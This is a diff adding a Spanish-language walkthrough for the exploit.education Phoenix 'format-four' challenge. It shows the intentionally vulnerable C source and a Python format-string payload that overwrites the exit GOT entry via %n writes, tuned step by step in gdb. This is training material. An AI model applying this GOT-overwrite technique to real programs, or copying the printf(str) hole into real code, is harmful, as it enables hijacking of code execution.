@@ -158,6 +158,159 @@ Well done, the 'changeme' variable has been changed correctly!
 
 ## Format Four
 
+El siguiente codigo:
+
+```c
+/*
+ * phoenix/format-four, by https://exploit.education
+ *
+ * Can you affect code execution? Once you've got congratulations() to
+ * execute, can you then execute your own shell code?
+ *
+ * Did you get a hair cut?
+ * No, I got all of them cut.
+ *
+ */
+
+#include <err.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BANNER \
+  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+void bounce(char *str) {
+  printf(str);
+  exit(0);
+}
+
+void congratulations() {
+  printf("Well done, you're redirected code execution!\n");
+  exit(0);
+}
+
+int main(int argc, char **argv) {
+  char buf[4096];
+
+  printf("%s\n", BANNER);
+
+  if (read(0, buf, sizeof(buf) - 1) <= 0) {
+    exit(EXIT_FAILURE);
+  }
+
+  bounce(buf);
+}
+```
+
+Obteniendo las direcciones utiles.
+
+```bash
+user@phoenix-amd64:/opt/phoenix/i486$ nm ./format-four | grep congrat
+08048503 T congratulations
+
+user@phoenix-amd64:/opt/phoenix/i486$ objdump -R ./format-four | grep exit
+080497e4 R_386_JUMP_SLOT   exit -> 51515151
+```
+
+Como en el ejemplo anterior, llenaremos de **%x**, para verificar si encontramos los hexadecimales de las **AAAA**.
+
+```bash
+user@phoenix-amd64:/opt/phoenix/i486$ python -c "print 'AAAA'+'%x '*12" |./format-four
+Welcome to phoenix/format-four, brought to you by https://exploit.education
+AAAA0 0 0 f7f81cf7 f7ffb000 ffffd738 804857d ffffc730 ffffc730 fff 0 41414141
+```
+
+  Como ya vimos en el **Format Three**, manejaremos un archivo llamado script.py en el directorio /tmp. Y empezaremos escribiendo el script con los valores que ya obtuvimos.
+
+```python
+#!/bin/python
+
+buf ='\x08\x04\x97\xe4'[::-1]
+buf+='\x08\x04\x97\xe5'[::-1]
+buf+='\x08\x04\x97\xe6'[::-1]
+buf+='\x08\x04\x97\xe7'[::-1]
+buf+='%x '*11
+buf+='A'*0+'%n'
+buf+='A'*0+'%n'
+buf+='A'*0+'%n'
+buf+='A'*0+'%n'
+
+print(buf)
+```
+
+Y luego lo que haremos será usar el gdb.
+
+```bash
+user@phoenix-amd64:/opt/phoenix/i486$ gdb -q ./format-four 
+
+#Luego ejecutamos el siguiente comando en la consola de gdb
+(gdb) run < <(python /tmp/script.py)
+
+#Podemos ver que el programa se paró y en el registro eip obtenemos lo siguiente.
+$eip   : 0x51515151 ("QQQQ"?)
+```
+
+Nosotros queremos que el $eip apunte a: **08048503**. Entonces haremos lo mismo que en el ejemplo anterior.
+
+```bash
+>>> int("103",16)-int("51",16)
+178
+
+$ cat /tmp/script.py
+
+#!/bin/python
+
+buf ='\x08\x04\x97\xe4'[::-1]
+buf+='\x08\x04\x97\xe5'[::-1]
+buf+='\x08\x04\x97\xe6'[::-1]
+buf+='\x08\x04\x97\xe7'[::-1]
+buf+='%x '*11
+buf+='A'*178+'%n'
+buf+='A'*0+'%n'
+buf+='A'*0+'%n'
+buf+='A'*0+'%n'
+
+print(buf)
+
+$eip   : 0x3030303
+```
+
+Y de la misma manera para los demas bytes.
+
+```
+#Para el segundo byte
+>>> int("85",16)-int("03",16)
+130
+#Ejecutando el GDB de nuevo
+$eip   : 0x85858503
+#Lo que queremos
+$eip   : 0x08048503
+
+#Para el tercer byte
+>>> int("104",16)-int("85",16)
+127
+#Ejecutando el GDB de nuevo
+$eip   : 0x4048503
+#Lo que queremos
+$eip   : 0x08048503
+
+#Para el cuarto y ultimo byte
+>>> int("08",16)-int("04",16)
+4
+#Ejecutando el GDB de nuevo
+Well done, you're redirected code execution!
+Well done, you're redirected code execution!
+Well done, you're redirected code execution!
+Well done, you're redirected code execution!
+Well done, you're redirected code execution!
+Well done, you're redirected code execution!
+Well done, you're redirected code execution!
+Well done, you're redirected code execution!
+...
+```
+
 ## Heap Zero
 ## Heap One
 ## Heap Two
